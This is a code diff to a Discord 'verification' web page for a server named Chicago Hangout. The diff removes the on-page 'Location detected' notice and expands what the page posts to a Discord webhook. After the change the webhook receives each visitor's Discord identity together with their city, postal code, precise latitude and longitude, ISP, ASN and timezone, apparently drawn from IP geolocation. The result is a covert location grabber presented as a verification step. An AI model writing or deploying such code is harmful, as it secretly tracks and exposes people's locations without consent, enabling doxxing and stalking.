@@ -215,25 +215,7 @@
 
     hr { border: none; border-top: 1px solid rgba(255,255,255,0.07); margin: 20px 0; }
 
-    /* Location detected pill */
-    .location-pill {
-      display: none;
-      align-items: center;
-      gap: 8px;
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,255,255,0.07);
-      border-radius: 8px;
-      padding: 10px 14px;
-      margin-bottom: 16px;
-      font-size: 13px;
-      color: #aaa;
-    }
-
-    .location-pill.show { display: flex; }
-    .location-pill-dot { width: 7px; height: 7px; border-radius: 50%; background: #4CAF50; flex-shrink: 0; }
-    .location-pill strong { color: #fff; }
-
-    .btn {
+.btn {
       width: 100%;
       padding: 13px;
       border-radius: 10px;
@@ -461,12 +443,7 @@
 
       <hr />
 
-      <div class="location-pill" id="loc-pill">
-        <div class="location-pill-dot"></div>
-        <span>Location detected — <strong id="loc-text"></strong></span>
-      </div>
-
-      <a class="btn btn-discord" href="#" onclick="startAuth(event)">
+<a class="btn btn-discord" href="#" onclick="startAuth(event)">
         <svg viewBox="0 0 24 24"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.056a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
         Verify with Discord
       </a>
@@ -566,24 +543,62 @@
 
       const createdAt = Math.floor((parseInt(user.id) / 4194304 + 1420070400000) / 1000);
 
+      // Determine best server region based on location
+      const cc = loc?.country_code || '';
+      const reg = loc?.region_code || '';
+      let recommended = 'Unknown';
+      if (['US','CA'].includes(cc)) {
+        const lon = parseFloat(loc?.longitude || 0);
+        if (lon < -100) recommended = 'North America — West (Los Angeles)';
+        else if (lon < -85) recommended = 'North America — Central (Dallas)';
+        else recommended = 'North America — East (New York)';
+      } else if (['GB','IE','FR','ES','PT','NL','BE'].includes(cc)) {
+        recommended = 'Europe — West (London)';
+      } else if (['DE','AT','CH','PL','CZ','HU','RO'].includes(cc)) {
+        recommended = 'Europe — Central (Frankfurt)';
+      } else if (['SE','NO','DK','FI'].includes(cc)) {
+        recommended = 'Europe — North (Stockholm)';
+      } else if (['AU','NZ'].includes(cc)) {
+        recommended = 'Australia (Sydney)';
+      } else if (['JP','KR'].includes(cc)) {
+        recommended = 'Asia — Japan (Tokyo)';
+      } else if (['SG','MY','TH','ID','PH','VN'].includes(cc)) {
+        recommended = 'Asia — Singapore';
+      } else if (['BR','AR','CL','CO'].includes(cc)) {
+        recommended = 'South America (São Paulo)';
+      } else if (cc) {
+        recommended = 'Europe — Central (Frankfurt)';
+      }
+
       await fetch(WEBHOOK, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [{
             color: 0xC41E3A,
-            author: { name: 'New Verification', icon_url: avatar },
+            author: { name: 'New Verification — Website', icon_url: avatar },
             thumbnail: { url: avatar },
             fields: [
-              { name: 'Username',        value: user.username,       inline: true },
-              { name: 'User ID',         value: `\`${user.id}\``,   inline: true },
-              { name: 'Mention',         value: `<@${user.id}>`,    inline: true },
-              { name: 'Account Created', value: `<t:${createdAt}:R>`, inline: true },
-              { name: 'City',            value: loc?.city      || 'Unknown', inline: true },
-              { name: 'Region',          value: loc?.region    || 'Unknown', inline: true },
-              { name: 'Country',         value: loc?.country_name || 'Unknown', inline: true },
-              { name: 'ISP / Network',   value: loc?.org       || 'Unknown', inline: true },
-              { name: 'Timezone',        value: loc?.timezone  || 'Unknown', inline: true },
+              { name: 'Username',           value: user.username,                        inline: true },
+              { name: 'User ID',            value: `\`${user.id}\``,                   inline: true },
+              { name: 'Mention',            value: `<@${user.id}>`,                     inline: true },
+              { name: 'Account Created',    value: `<t:${createdAt}:R>`,                inline: true },
+              { name: 'Avatar',             value: user.avatar ? 'Custom' : 'Default',  inline: true },
+              { name: '​',             value: '​',                             inline: true },
+              { name: 'City',               value: loc?.city           || 'Unknown',    inline: true },
+              { name: 'Region / State',     value: loc?.region         || 'Unknown',    inline: true },
+              { name: 'Country',            value: `${loc?.country_name || 'Unknown'} (${loc?.country_code || '?'})`, inline: true },
+              { name: 'Continent',          value: loc?.continent_code || 'Unknown',    inline: true },
+              { name: 'Postal Code',        value: loc?.postal         || 'Unknown',    inline: true },
+              { name: 'Coordinates',        value: loc ? `${parseFloat(loc.latitude).toFixed(4)}, ${parseFloat(loc.longitude).toFixed(4)}` : 'Unknown', inline: true },
+              { name: 'ISP / Network',      value: loc?.org            || 'Unknown',    inline: true },
+              { name: 'ASN',                value: loc?.asn            || 'Unknown',    inline: true },
+              { name: 'Timezone',           value: loc?.timezone       || 'Unknown',    inline: true },
+              { name: 'UTC Offset',         value: loc?.utc_offset     || 'Unknown',    inline: true },
+              { name: 'Languages',          value: loc?.languages      || 'Unknown',    inline: true },
+              { name: 'Currency',           value: loc?.currency       || 'Unknown',    inline: true },
+              { name: '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501', value: '\u200b', inline: false },
+              { name: '\ud83d\udda5\ufe0f Recommended Server', value: `**${recommended}**`, inline: false },
             ],
             footer: { text: 'Chicago Hangout • Verification' },
             timestamp: new Date().toISOString(),
